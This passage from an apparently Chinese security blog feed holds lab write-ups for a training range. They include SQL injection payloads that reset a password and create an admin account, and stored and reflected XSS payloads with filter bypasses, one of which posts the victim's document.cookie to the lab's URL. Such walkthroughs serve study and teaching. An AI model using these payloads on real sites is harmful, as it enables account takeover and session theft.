alt></p><br><ul><li>通过分析上述操作，其实我们可以更进一步，修改已经有的密码或者创建自己的管理员账号</li><li>那么就来试试吧</li></ul><br><ul><li>首先尝试构造语句，尝试直接修改<code>staff_bob</code>的密码</li></ul><p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(6).png" alt></p><ul><li><pre class=" language-sql"><code class="language-sql"><span class="token number">123</span><span class="token string">' OR 1=1;update staff set s_psw='</span><span class="token number">123456</span><span class="token string">' where s_user='</span>staff_bob' <span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#这段的意思是从表中找出用户staff_bob，然后将密码设置为123456</span></code></pre></li><li><p>然后尝试用123456登录，登录成功，但是不知道为啥，权限又变回了0，可能是靶场的规则吧</p></li></ul><p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(3).png" alt></p><ul><li><p>接着我们试试能不能直接创建一个账户</p><ul><li><p>目前已经知道的字段有<code>s_user</code>、<code>s_psw</code>、<code>s_power</code></p></li><li><p>构造payload</p><ul><li><pre class=" language-sql"><code class="language-sql"><span class="token number">123</span><span class="token string">' OR 1=1;INSERT INTO  staff (s_user,s_psw,s_power) VALUES ('</span>wkai<span class="token string">','</span>wkai<span class="token string">','</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#向表staff中插入用户名wkai，密码wkai，权限1</span></code></pre></li><li><p>最后再用wkai这个账号登录，发现不仅能登录，而且权限也直接是1</p></li></ul></li></ul></li></ul><p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(2).png" alt></p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>（六）跨站脚本XSS之数据库存储</title>
      <link href="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/"/>
      <url>/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="一-靶场说明"><a href="#一-靶场说明" class="headerlink" title="一 靶场说明"></a>一 靶场说明</h4><ul><li><p>本篇是对存储型xss的认识和利用。绕过过滤的方法也用到了前面介绍过的几个技巧。除此之外，我还分析了下靶场的实现原理。</p></li><li><p>需要用到的技能：拼接绕过，引号转换</p></li><li><p>靶场由<a href="https://zhishihezi.net/box/" target="_blank" rel="noopener">知识盒子</a>提供，靶场地址：<a href="https://tofu.exeye.run/commit/log_page" target="_blank" rel="noopener">https://tofu.exeye.run/commit/log_page</a></p></li><li><p>靶场要求：利用评论区构造XSS，让受害者点击恶意评论，发送自己的cookie给发送给指定的URL，如果网站判定cookie是正确的，那么攻击者的页面将会弹窗出正确的flag</p></li><li><p>所以我们需要注册两个账户，一个模拟攻击者，一个模拟受害者</p></li></ul><table><thead><tr><th>角色</th><th>账号</th><th>密码</th></tr></thead><tbody><tr><td>攻击者</td><td>07034170</td><td>123</td></tr><tr><td>受害者</td><td>03174171</td><td>123</td></tr></tbody></table><br><h4 id="二-具体步骤"><a href="#二-具体步骤" class="headerlink" title="二 具体步骤"></a>二 具体步骤</h4><ul><li>打开靶场页面，可以看到，需要我们登录，可以注册账户</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/QQ%E6%88%AA%E5%9B%BE20200802180022.png" alt></p><ul><li>先用账户一去登录</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(5).png" alt></p><ul><li>登录进去后，页面上方是评论区，下方是评论框</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(10).png" alt></p><ul><li>我们先随便评论个123，然后用控制台找到源代码所在位置</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(4).png" alt></p><ul><li>然后我们先直接评论个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现这个弟弟直接将<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>过滤掉了</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(15).png" alt></p><ul><li>那我们只能尝试闭合log字段制造一个onclick事件了，评论”onclick=”alert(1)，但是很不幸，他还做了onclick的过滤，而且把第一个双引号转换成中文形式了。</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(3).png" alt></p><ul><li>这里用一个技能：拼接绕过，将一个<code>onclick</code>中再插入    一个<code>onclick</code>，这样中间的<code>onclick</code>被过滤掉后外面刚好拼接成一个新的<code>onclick</code></li><li>但是我们的引号问题无法解决，这里可以尝试多打几个引号，看他到底会转换几个</li><li>我们可以看到，这里输入了三个引号，结果只转换了第一个</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(8).png" alt></p><ul><li><p>所以我们的payload应该是这样的，前面用多个引号</p></li><li><pre class=" language-javascript"><code class="language-javascript"><span class="token string">""</span>onconclicklick<span class="token operator">=</span>"<span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre></li></ul><ul><li>查看源代码，成功构造了onclick事件</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(7).png" alt></p><ul><li>点击评论，也能直接触发弹窗</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(16).png" alt></p><ul><li><p>看来已经可以触发XSS了，那么就该上真正的payload了</p></li><li><p>和上次一样，让onclick事件执行ajax代码，所以我们的最终payload应该是：</p></li><li><pre class=" language-javascript"><code class="language-javascript"><span class="token string">""</span> onclonclickick<span class="token operator">=</span>"$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>url<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`https://tofu.exeye.run/commit/check`</span></span><span class="token punctuation">,</span>                        type<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`post`</span></span><span class="token punctuation">,</span>                        data<span class="token punctuation">:</span><span class="token punctuation">{</span>cookie<span class="token punctuation">:</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">,</span>xsser<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`07034170`</span></span><span class="token punctuation">}</span>                        <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(13).png" alt></p></li><li><p>这段payload的意思是向指定的URL发送POST请求，请求中附带了点击者的cookie</p></li><li><p>接着我们再开另一个浏览器去登录账户二，模拟受害者点击恶意评论</p></li><li><p>不过我们先开启抓包</p></li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(17).png" alt></p><ul><li>可以看到我们发送了一个POST请求，数据内容包含了受害者的cookie和攻击者的用户名</li><li>释放这个数据包，回到攻击者的账户，刷新页面，拿到正确flag</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(6).png" alt></p><br><h4 id="三-分析靶场原理-（过河拆桥）"><a href="#三-分析靶场原理-（过河拆桥）" class="headerlink" title="三 分析靶场原理 （过河拆桥）"></a>三 分析靶场原理 （过河拆桥）</h4><ul><li>通过抓包分析，我们发现如果将受害者发送的POST请求包发送repeater，可以看到如果cookie正确（已经注册的账户cookie将会被记录），将会返回执行成功，同时发送的攻击者账号应该也会被记录下来</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(11).png" alt></p><ul><li>否则返回404not found</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(12).png" alt></p><ul><li><p>那么我们可以在payload中加入了响应成功就弹窗的代码：success:function(res){alert(res)}    （来个画蛇添足）</p></li><li><pre class=" language-javascript"><code class="language-javascript"><span class="token string">""</span> onclonclickick<span class="token operator">=</span>"$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>url<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`https://tofu.exeye.run/commit/check`</span></span><span class="token punctuation">,</span>                        type<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`post`</span></span><span class="token punctuation">,</span>                        data<span class="token punctuation">:</span><span class="token punctuation">{</span>cookie<span class="token punctuation">:</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">,</span>xsser<span class="token punctuation">:</span><span class="token template-string"><span class="token string">`07034170`</span></span><span class="token punctuation">}</span><span class="token punctuation">,</span>                        success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">}</span>                        <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li></ul><ul><li>这样受害者点击后发送POST请求成功后就会将响应内容弹窗出来</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(9).png" alt></p><ul><li><p>接着，分析下部分源代码</p></li><li><pre class=" language-javascript"><code class="language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//访问指定URL，如果返回值不为2，则会将弹窗内容返回出来</span>            url<span class="token punctuation">:</span> <span class="token string">'https://tofu.exeye.run/commit/getPassCard'</span><span class="token punctuation">,</span>            type<span class="token punctuation">:</span> <span class="token string">'get'</span><span class="token punctuation">,</span>            success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                   <span class="token function">alert</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>               <span class="token punctuation">}</span>             <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li></ul><ul><li><p>这段代码我猜想他的意思是，向指定URL发送GET请求，服务器收到请求后，会根据记录中是否有你的cookie来决定响应内容，如果存在返回的是正确的flag，否则将会返回的是2，函数中判断res如果是2，那么将不会弹窗</p></li><li><p>所以靶场实现的原理应该是</p></li><li><ul><li>受害者点击恶意代码</li><li>通过POST请求将自己的cookie和攻击者的账号发送给服务器</li><li>服务器首先会判断发送的cookie是否存在，我猜想在注册的时候，服务器就已经将cookie和账号记录在某个地方了</li><li>如果存在，攻击者的账号将会被记录到另一个地方，同时那里也会记录攻击者账号对应的cookie</li><li>攻击成功后，攻击者再登录将会发送一个GET请求</li><li>如果攻击者的账号已经被记录，那么返回的res就会是flag，否则返回值是2根本不会弹窗。</li></ul></li><li><p>通过抓包验证下</p><ul><li>首先我们记录下已经攻击成功的账号07034170的cookie：06aee212c454c2e4db96e0876b7e2ec0</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(2).png" alt></p><ul><li>然后我们再登录受害者的账号</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(1).png" alt></p><ul><li>此时记录的是受害者账号03174171账号的cookie</li><li>通过抓包，受害者账号因为没有被服务器记录，所以响应的内容是2，不会弹窗</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard.png" alt="用受害者的cookie发送请求"></p><ul><li>这时候我们再将cookie换成攻击者03174171的</li><li>可以看到返回了正确的flag</li></ul><p><img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(14).png" alt="用攻击者的cookie发送请求"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（三）跨站脚本XSS之多点输入</title>
      <link href="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/"/>
      <url>/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<ul><li>本篇也是讲xss的攻击思路。当存在多个输入点时。开发者可能会有疏忽，并没有做好每个输入点的过滤防御,我们应该尽可能对每个输入点进行测试，抓住破绽。    靶场由<a href="https://zhishihezi.net/box/" target="_blank" rel="noopener">知识盒子</a>提供，靶场地址：<a href="https://tofu.exeye.run/output" target="_blank" rel="noopener">https://tofu.exeye.run/output</a></li><li>打开页面是这样的</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(5).png" alt></p><ul><li><p>按照套路我们直接看下他的javascript代码，发现存在两个输出点</p></li><li><pre class=" language-javascript"><code class="language-javascript"> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.user-box-top'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.ipt-name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">//将名字输入框中的内容加入到类user-box-top的标签中</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.age-box-top'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.ipt-age'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">//将年龄输入框中的内容加入到类age-box-top的标签中</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li><li><p>输出点里标签里的内容可随意输入内容</p></li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(2).png" alt></p><ul><li>尝试从名字和年龄这两个输出点入手</li><li>首先是名字，直接输入框上<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,但是情况好像不太妙，因为我们输入的&lt;&gt;好像会被过滤</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(6).png" alt></p><ul><li>所以只能考虑年龄框了，但是如果这都能成功的话，那未免也太傻逼了，年龄框被要求只能输入数字</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(9).png" alt></p><ul><li><p>所以这里有两种方法</p><ul><li><p>方法一：用burp抓包绕过</p><ul><li>输入正常的数据，然后用burp开启抓包</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(7).png" alt></p><ul><li>将年龄改为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(8).png" alt></p><ul><li>最后将数据包放掉，成功实现弹窗</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard.png" alt></p></li><li><p>方法二：直接修改前端代码</p><ul><li>观察源代码，我们发现，他只是在前端对输入做了限制，只允许输入数字</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(4).png" alt></p><ul><li>如果将这个限制直接删除，就不会提示限制了</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(3).png" alt></p><ul><li>提交数据直接弹窗</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%B8%89%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%A4%9A%E7%82%B9%E8%BE%93%E5%85%A5/clipboard(1).png" alt></p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（二）跨站脚本XSS之打破网页结构</title>
      <link href="/2020/07/28/%EF%BC%88%E4%BA%8C%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E4%B9%8B%E6%89%93%E7%A0%B4%E7%BD%91%E9%A1%B5%E7%BB%93%E6%9E%84/"/>
      <url>/2020/07/28/%EF%BC%88%E4%BA%8C%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E4%B9%8B%E6%89%93%E7%A0%B4%E7%BD%91%E9%A1%B5%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<ul><li>这个靶场主要是讲一个xss攻击技巧，当我们发现自己的输入值进入了html标签的属性值。那么我们就可以想办法打破闭合标签，造成xss。靶场由<a href="https://zhishihezi.net/box/" target="_blank" rel="noopener">知识盒子</a>提供，靶场地址：<a href="https://tofu.exeye.run/dom" target="_blank" rel="noopener">https://tofu.exeye.run/dom</a></li></ul><br><ul><li><p>打开页面依旧是只有一个搜索框</p></li><li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%8C%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E4%B9%8B%E6%89%93%E7%A0%B4%E7%BD%91%E9%A1%B5%E7%BB%93%E6%9E%84/clipboard.png" alt></p></li><li><p>尝试输入些数据，发现数据并不会存取到历史记录中</p></li><li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%8C%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E4%B9%8B%E6%89%93%E7%A0%B4%E7%BD%91%E9%A1%B5%E7%BB%93%E6%9E%84/clipboard(4).png" alt></p></li><li><p>打开控制台定位到输入框</p></li><li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%8C%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E4%B9%8B%E6%89%93%E7%A0%B4%E7%BD%91%E9%A1%B5%E7%BB%93%E6%9E%84/clipboard(2).png" alt></p></li><li><p>遇到这种可以控制标签属性值的情况，可以尝试闭合标签页，破坏网页结构，造成XSS</p></li><li><pre class=" language-javascript"><code class="language-javascript">"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>  <span class="token comment" spellcheck="true">//注意：这里括号里的单引号不能丢</span></code></pre></li><li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%8C%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E4%B9%8B%E6%89%93%E7%A0%B4%E7%BD%91%E9%A1%B5%E7%BB%93%E6%9E%84/clipboard(1).png" alt></p></li><li><p>被破坏后的网页结构</p></li><li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%8C%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E4%B9%8B%E6%89%93%E7%A0%B4%E7%BD%91%E9%A1%B5%E7%BB%93%E6%9E%84/clipboard(3).png" alt></p></li><li><p>最后再分析javascript代码，事实上正常流程应当先分析javascript代码的</p></li><li><pre class=" language-javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.search-ipt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">//定义输入框函数</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.search-ipt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                   <span class="token comment" spellcheck="true">//从输入框中得到的数据若为空</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.history'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">,</span><span class="token string">'none'</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">//类history的css样式为空</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.history'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">,</span><span class="token string">'block'</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span>    <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.search-ipt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true">//若不为空则将数据赋予val</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.history'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">'&lt;a href="/?search='</span><span class="token operator">+</span>val<span class="token operator">+</span><span class="token string">'">暂无搜索结果&lt;/a>'</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">//再将val的值嵌入到类history的标签中</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（五）跨站脚本XSS之长度限制</title>
      <link href="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/"/>
      <url>/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<ul><li><p>我们平时测试总会用alert(1)去测试是否存在xss漏洞，但真到了要利用这个漏洞。执行的代码就不是alert(1)这么简单了，一些输入点具有字符长度的限制，可能测试语句alert(1)可以顺利执行，但真正的利用代码就会很长，导致无法顺利利用，本篇文章将会介绍些突破长度限制的方法。</p></li><li><p>靶场由<a href="https://zhishihezi.net/box/" target="_blank" rel="noopener">知识盒子</a>提供，靶场五    地址：<a href="https://tofu.exeye.run/limit" target="_blank" rel="noopener">https://tofu.exeye.run/limit</a></p></li><li><p>靶场的要求是用XSS构造一个POST请求，将自己的cookie发送到指定的URL，指定的URL会根据你发送的cookie值来决定响应内容，如果正确的话，网页将会弹出正确的flag，否则会弹出请传入正确的cookie参数</p><ul><li><p>打开页面，只有一个搜索按钮可以点击，而且题目是突破长度限制，说明输入是有限制的</p><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(1).png" alt></p></li></ul><ul><li>尝试通过输入字符找出限制，通过输入四组1到9，发现第四组的789没有出现在记录中，所以我们最多输入的字符为33个</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(2).png" 